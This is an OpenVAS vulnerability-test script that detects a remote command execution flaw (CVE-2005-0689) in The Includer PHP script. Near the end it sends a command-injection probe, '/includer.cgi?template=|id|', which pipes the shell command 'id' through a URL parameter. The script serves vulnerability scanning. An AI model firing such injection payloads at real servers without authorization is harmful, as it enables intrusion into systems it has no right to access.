###############################################################################
# OpenVAS Vulnerability Test
# $Id: includer_rcmdexec.nasl 12007 2018-10-22 07:43:49Z cfischer $
#
# The Includer remote command execution flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20296");
  script_version("$Revision: 12007 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 09:43:49 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_bugtraq_id(12738);
  script_cve_id("CVE-2005-0689");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("The Includer remote command execution flaw");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=111021730710779&w=2");

  script_tag(name:"summary", value:"The remote host is running The Includer, a PHP script for emulating
  server-side includes that is affected by a remote code execution vulnerability.");

  script_tag(name:"impact", value:"The version of The Includer installed on the remote host allows an
  attacker to execute arbitrary shell commands by including shell meta-characters as part of the URL.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir( make_list_unique( "/includer", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  req = http_get( item:string( dir, "/includer.cgi?template=vt-test" ), port:port );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(!res) continue;

  if ( "document.write" >< res && "uid=" >!< res ) {
    http_check_remote_code( unique_dir:dir, check_request:"/includer.cgi?template=|id|", check_result:"uid=[0-9]+.*gid=[0-9]+.*", command:"id", port:port );
  }
}

exit( 0 );